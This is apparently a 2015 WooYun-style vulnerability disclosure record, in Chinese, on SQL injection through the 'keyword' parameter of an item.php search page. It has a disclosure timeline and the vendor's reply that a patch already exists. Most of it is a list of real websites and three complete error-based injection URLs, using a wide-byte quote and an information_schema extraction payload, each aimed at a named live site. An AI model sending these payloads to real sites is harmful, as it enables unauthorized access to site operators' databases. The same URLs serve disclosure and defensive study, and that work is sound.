wybug_status: 漏洞已经通知厂商但是厂商忽略漏洞
wybug_detail:
漏洞详情 披露状态：   									2015-06-08：	细节已通知厂商并且等待厂商处理中									2015-06-11：	厂商主动忽略漏洞，细节向第三方安全合作伙伴开放									2015-08-05：	细节向核心白帽子及相关领域专家公开									2015-08-15：	细节向普通白帽子公开									2015-08-25：	细节向实习白帽子公开									2015-09-09：	细节向公众公开  简要描述： RT 详细说明：  漏洞文件：
/item.php中的keyword参数存在注入
案例：
http://www.zlsbpjw.nethttp://www.xc777.comhttp://www.0714.lahttp://www.haochibu.comhttp://dianping.alexue.comhttp://www.xishan100.com
   漏洞证明：  SQL1
http://www.zlsbpjw.net/item.php?act=search&keyword=%d5%27%20and(select%201%20from(select%20count(*),concat((select%20(select%20(SELECT%20distinct%20concat(0x7e,0x27,char(99,102,114,101,101,114),0x27,0x7e)%20FROM%20information_schema.schemata%20LIMIT%200,1))%20from%20information_schema.tables%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%20and%201=1%23&searchsort=subject&catid=0&ordersort=addtime&ordertype=asc&searchsubmit=yes


SQL2
http://www.xc777.com/item.php?act=search&keyword=%d5%27%20and(select%201%20from(select%20count(*),concat((select%20(select%20(SELECT%20distinct%20concat(0x7e,0x27,char(99,102,114,101,101,114),0x27,0x7e)%20FROM%20information_schema.schemata%20LIMIT%200,1))%20from%20information_schema.tables%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%20and%201=1%23&searchsort=subject&catid=0&ordersort=addtime&ordertype=asc&searchsubmit=yes


SQL3
http://www.xishan100.com//item.php?act=search&keyword=%d5%27%20and(select%201%20from(select%20count(*),concat((select%20(select%20(SELECT%20distinct%20concat(0x7e,0x27,char(99,102,114,101,101,114),0x27,0x7e)%20FROM%20information_schema.schemata%20LIMIT%200,1))%20from%20information_schema.tables%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%20and%201=1%23&searchsort=subject&catid=0&ordersort=addtime&ordertype=asc&searchsubmit=yes

wybug_reply: 漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-09-09 12:44 厂商回复： 此漏洞去年已经发布修复，有些网站未更新安全补丁。 最新状态： 暂无
